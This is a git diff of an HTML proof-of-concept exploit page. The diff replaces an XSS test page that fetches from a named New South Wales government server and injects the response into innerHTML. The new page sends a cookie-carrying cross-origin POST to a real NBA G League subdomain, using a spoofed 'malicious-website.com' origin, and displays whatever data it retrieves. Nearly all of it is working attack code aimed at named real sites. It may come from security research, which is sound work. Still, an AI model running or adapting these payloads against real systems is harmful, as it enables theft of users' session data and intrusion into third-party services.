@@ -2,28 +2,37 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>XSS PoC</title>
+    <title>CORS Vulnerability PoC</title>
 </head>
 <body>
-    <h1>XSS PoC</h1>
-    <script>
-        // Function to handle data received from vulnerable server
-        function handleData(data) {
-            // Inject data into the page to trigger XSS
-            document.body.innerHTML = data;
-        }
+    <h1>Exploiting CORS Vulnerability</h1>
+    <button id="exploitButton">Exploit CORS</button>
 
-        // Send a request to the vulnerable server
-        fetch('https://strapi-server.account.service.nsw.gov.au/', {
-            method: 'GET',
-            headers: {
-                'Origin': 'https://moatyani.github.io/github.io/'
-            }
-        })
-        .then(response => response.text())
-        .then(handleData)
-        .catch(err => console.error(err));
+    <script>
+        document.getElementById('exploitButton').addEventListener('click', function() {
+            fetch('https://cpskyhawks.gleague.nba.com/RWOCz7YXcKYRDNpvrXHn5vWD/D3fEpbQ1YONVOE/EHwtRzUrGAU/HmkjcRt/kcXYB', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'text/plain;charset=UTF-8',
+                    'Origin': 'https://malicious-website.com', // Replace with the attacker's domain
+                },
+                body: JSON.stringify({
+                    "sensor_data": "3;0;3618116;4272452;1,33,0,1,0,26;..." // Truncated for brevity
+                }),
+                credentials: 'include' // This will include cookies, potentially exposing sensitive information
+            })
+            .then(response => response.text())
+            .then(data => {
+                console.log('Success:', data);
+                alert('Data retrieved: ' + data);
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Failed to exploit CORS');
+            });
+        });
     </script>
 </body>
 </html>
